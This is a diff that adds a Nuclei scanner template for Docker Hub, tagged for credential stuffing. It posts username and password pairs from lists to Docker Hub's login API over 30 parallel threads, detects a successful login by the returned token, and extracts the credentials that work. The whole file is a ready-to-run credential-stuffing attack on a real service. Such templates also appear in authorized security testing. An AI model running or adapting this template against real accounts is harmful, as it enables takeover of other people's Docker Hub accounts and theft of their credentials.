@@ -1,0 +1,52 @@
+id: docker-hub-login-check
+
+info:
+  name: Docker Hub Login Check
+  author: parthmalhotra,pdresearch
+  severity: critical
+  description: Checks for a valid Docker Hub account.
+  reference:
+    - https://owasp.org/www-community/attacks/Credential_stuffing
+  metadata:
+    max-request: 1
+  tags: creds-stuffing,login-check,cloud,docker
+
+self-contained: true
+
+http:
+  - raw:
+      - |
+        POST https://hub.docker.com/v2/users/login HTTP/1.1
+        Host: hub.docker.com
+        Content-Type: application/json
+
+        {
+          "username": "{{username}}",
+          "password": "{{password}}"
+        }
+
+    threads: 30
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'token'
+
+      - type: word
+        part: header
+        words:
+          - 'Set-Cookie: token='
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username
+          - password
+# digest: 4b0a0048304602210087f05becfd78120ff02026e8c08d58d92900f400937dd5d701fe29cdd9ed0532022100ad245f9d8aa9c785febc03c01d22aed33fe68354283e5d1658b583d074fde9ca:922c64590222798bb761d5b6d8e72950
